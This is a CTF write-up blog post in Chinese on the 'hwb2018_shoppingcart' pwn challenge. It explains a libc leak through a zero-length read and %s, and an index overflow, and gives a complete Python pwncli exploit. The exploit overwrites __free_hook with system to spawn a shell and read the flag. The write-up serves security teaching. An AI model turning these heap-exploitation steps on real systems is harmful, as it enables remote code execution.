# hwb2018_shoppingcart



### 总结

根据本题，学习与收获有：

- `read`当长度为`0`的时候，会返回`0`
- `%s`遇到`\0`才会结束输出，遇到`\n`并不会结束输出
- 某个地址存储了`__free_hook`的地址，搜一把就得到了

<!-- more -->

### 题目分析

#### checksec

![image-20210912181144590](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210912181144590.png)

远程环境为`libc-2.27.so`

#### 漏洞点

主要在`modify`中，有一个打印地址和索引溢出

![image-20210912180856329](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210912180856329.png)

### 利用思路

在`buy`函数中，会有一个置`0`的操作：

![image-20210912181245356](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210912181245356.png)

当时在这里卡了一段时间，后来发现，如果输入长度为`0`，就不会将`chunk`的`fd`某个字节置为`0`了，那么结合`modify`函数中的`%s`即可泄露出地址。

最后利用过程即为：

- 利用`%s`和`read`为`0`的第三个参数，泄露出`libc`的地址
- 修改索引为`-2`处的拿个地址为存储着`__free_hook`的地址
- 修改索引为`-22`的内容，就是修改`__free_hook`，修改为`system`
- 释放带有`/bin/sh`的块即可获取`shell`

### Exp

```python
#!/usr/bin/python3
from pwncli import *

cli_script()

p:tube = gift['io']
elf:ELF = gift['elf']
libc: ELF = gift['libc']

def add(data="a\n"):
    p.sendlineafter("EMMmmm, you will be a rich man!\n", "1")
    p.sendafter("I will give you $9999, but what's the  currency type you want, RMB or Dollar?\n", data)

def over():
    p.sendlineafter("EMMmmm, you will be a rich man!\n", "3")

def buy(length:int, data="a\n"):
    p.sendlineafter("Now, buy buy buy!\n", "1")
    p.sendlineafter("How long is your goods name?\n", str(length))
    if length != 0:
        p.sendafter("What is your goods name?\n", data)

def delete(idx:int):
    p.sendlineafter("Now, buy buy buy!\n", "2")
    p.sendlineafter("Which goods that you don't need?\n", str(idx))

def modify(idx:int, data="a\n"):
    p.sendlineafter("Now, buy buy buy!\n", "3")
    p.sendlineafter("Which goods you need to modify?\n", str(idx))
    p.recvuntil("OK, what would you like to modify ")
    msg = p.recvline()
    p.send(data)
    info("msg recv: {}".format(msg))
    return msg

def exp():
    for i in range(20):
        add("a" * 7)
    
    over()

    buy(0x500) # 0
    buy(0x10, "/bin/sh\x00\n") # 1

    # get unsorted bin
    delete(0)
    buy(0) # 2
    
    # leak libc addr
    msg = modify(2)
    libc_base_addr = u64(msg[:6].ljust(8, b"\x00")) - 0x3ec0d0
    log_address("libc_base_addr", libc_base_addr)

    # find the memory stores __free_hook address
    # use overflow index to change __free_hook's content to system
    modify(-2, p64(libc_base_addr + 0x3eaee8)[:7])
    modify(-22, p64(libc_base_addr + libc.sym['system'])[:7])

    # get shell
    delete(1)

    p.sendline("cat /flag")
    p.interactive()

exp()
```

### 引用与参考
1、[My Blog](https://roderickchan.github.io)

2、[Ctf Wiki](https://ctf-wiki.org/)

3、[pwncli](https://github.com/RoderickChan/pwncli)

---

> 作者: [roderick](https://roderickchan.github.io)  
> URL: https://roderickchan.github.io/zh-cn/2021-09-12-hwb2018-shoppingcart/  

